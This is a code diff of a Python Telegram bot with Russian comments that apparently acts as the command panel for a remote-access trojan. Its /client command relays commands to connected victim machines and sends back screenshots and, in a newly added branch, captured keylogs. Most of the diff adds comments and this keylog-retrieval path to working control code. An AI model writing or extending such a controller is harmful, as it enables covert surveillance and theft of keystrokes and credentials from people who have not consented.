@@ -27,7 +27,9 @@ dp = Dispatcher(bot)
 
 
 class TelegramNotificator:
+    """Класс для передачи уведомлений из клиента на телеграм"""
     def make_notification(text: str, *args):
+        """Отправляет уведомление в телеграме всем, кто добавился через команду /nitification или изначально находится в конфиге сервера"""
         for noti_id in config.NOTI_IDS:
             send_message(noti_id, text)
             send_fut = asyncio.run_coroutine_threadsafe(send_message(noti_id, args[0]), loop)
@@ -40,10 +42,14 @@ async def send_message(id, text):
 
 @dp.message_handler(commands=['notification'])
 async def notification_add(message: types.Message):
+    """Добавление/удаление чата в список для уведомлений"""
+    # проверка находится ли человек уже в списке, если да, то удаляет его, иначе добаляет
     if message.chat.id not in config.NOTI_IDS:
+        # дабавление в список для уведомлений
         config.NOTI_IDS.append(message.chat.id)
         await message.answer("сообщения будут приходить в этот чат")
     else:
+        # удаление из спискуа для уведомлений
         config.NOTI_IDS.pop(config.NOTI_IDS.index(message.chat.id))
         await message.answer("сообщения больше не будут приходить в этот чат")
 
@@ -69,14 +75,20 @@ async def client(message: types.Message):
     try:
         # обрезает команду /client
         message.text = message.get_args()
+        # передает команду менеджеру подключений, который передает ее к конкретному клиенту
         res = await mult.make_command_to_server(message.text)
+        # проверяет возврат, если он нулевой, то отправляет сообщение Nothing
         if res is None:
             await message.answer("Nothing")
+        # если вернулся не текст, а например файл
         if type(res) != str:
             try:
                 if res[0] == "screen":
                     await message.answer_document(open("screen.png", "rb"))
                     os.remove("screen.png")
+                elif res[0] == "doc":
+                    await message.answer_document(open("keylogs.txt", "rb"))
+                    os.remove("keylogs.txt")
             except Exception as err:
                 print(err)
             else:
@@ -90,6 +102,7 @@ async def client(message: types.Message):
 
 @dp.message_handler(content_types="document")
 async def client(message:types.Message):
+    """обработка сценария с присланным документом"""
     if message.caption == "":
         await message.reply("необходимо указать тег клиента")
     else:
@@ -109,18 +122,6 @@ async def client(message:types.Message):
 async def client(message: types.Message):
     exit()
 
-# def connection_monitor():
-#     """Мониторинг новых подключений"""
-#     t = threading.Thread(target=(mult.add_connection), daemon=True)
-#     t.start()
-
-# def connection_checker():
-#     """Проверка подключенных клиентов"""
-#     while True:
-#         mult.make_command_to_server("all ping")
-#         sleep(5)
-    
-
 mult = ManyServers(notificator=TelegramNotificator())
 
 loop = asyncio.get_event_loop()
@@ -129,10 +130,8 @@ loop = asyncio.get_event_loop()
 def main():
     """main"""
     loop = asyncio.get_event_loop()
-    # loop.create_server(ManyServers.view_all_servers)
     loop.create_server(ManyServers.make_command_to_server)
     loop.create_server(send_message)
-    # connection_monitor()
     try:
         executor.start_polling(dp, skip_updates=True)
     except Exception as er:
